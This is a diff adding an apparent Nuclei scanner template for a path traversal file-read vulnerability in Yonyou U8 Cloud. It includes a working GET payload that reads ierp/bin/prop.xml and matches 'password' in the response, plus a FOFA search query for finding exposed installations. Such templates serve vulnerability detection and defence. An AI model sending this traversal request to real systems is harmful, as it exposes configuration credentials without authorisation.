@@ -1,0 +1,29 @@
+id: yonyou-u8-cloud-ELTextFile-fileread
+
+info:
+  name: 用友 U8 Cloud ELTextFile.load.d - fileread
+  author: str1am
+  severity: high
+  description:
+  reference:
+  metadata:
+    verified: true
+    fofa-qeury: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,u8cloud,fileread,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<enableHotDeploy>"
+          - "password"
+        part: body
+        condition: and
